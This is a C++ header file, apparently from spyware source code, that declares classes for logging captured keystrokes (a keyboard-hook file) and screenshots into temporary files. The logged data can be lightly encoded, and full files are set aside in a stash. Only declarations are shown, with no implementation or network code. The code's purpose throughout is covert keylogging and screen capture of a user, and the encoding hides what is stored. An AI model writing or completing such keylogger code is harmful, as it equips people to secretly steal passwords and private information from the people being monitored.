#pragma once
#include <stdio.h>
#include "spy.h"

// just forward declare :|
class KBHookFile;
class SSHookFile;

// hold hook file info such as file handle,
// file path. auto open file for write(binary)
// when create new instance of this struct. auto
// release resources when this instance has been deleted
struct HOOK_FILE_HANDLE
{
	FILE * handle = NULL;
	char * filePath = NULL;
	HOOK_FILE_HANDLE(const char * filePath);
	~HOOK_FILE_HANDLE();
};

// just give a temp file path which put in
// buffer param
VOID get_temp_file_path(char * buffer);

// close all hook files
VOID close_all_files();

// get keyboard hook file, auto open new
// hook file if necessary and put hook file
// back to stash when full
KBHookFile * get_kbhook_file();

SSHookFile * get_sshook_file();

void force_stash_sshook_file();

// manage hook file such as write, encode, create...
// auto push to stash file when this instance has been deleted
class HookFile
{
	void open();
	void close();
protected:
	HOOK_FILE_HANDLE * fileHandle;
	size_t position;// current position in file
	bool writable() const;// check writable state
#ifdef SPY_ENCODE_DATA
	// encode a bytes array before write to file
	virtual size_t get_encode(const byte * in, byte * out, size_t n) const;
#endif
public:
	// a magic value to determine hook file type
	HookFile(const char * magic);
	~HookFile();
	size_t get_position() const;
	// check full state of this hook file instance
	virtual bool is_full() const;
	// write a bytes array to file
	void write(const void * chunk, size_t n);
};

// this is a keyboard hook file :|
class KBHookFile : public HookFile
{
	// this hook file will be full if file size is equal or greater this value
	static const long MAX_LENGTH = 0x100;
protected:
#ifdef SPY_ENCODE_DATA
	// a simple way to encode, just add even/odd value to byte value
	virtual size_t get_encode(const byte * in, byte * out, size_t n) const;
#endif
public:
	KBHookFile();
	virtual bool is_full() const;
};

// screenshot file
class SSHookFile : public HookFile
{
protected:
#ifdef SPY_ENCODE_DATA
	// a simple way to encode, just add even/odd value to byte value
	virtual size_t get_encode(const byte * in, byte * out, size_t n) const;
#endif
public:
	SSHookFile();
	virtual bool is_full() const;
};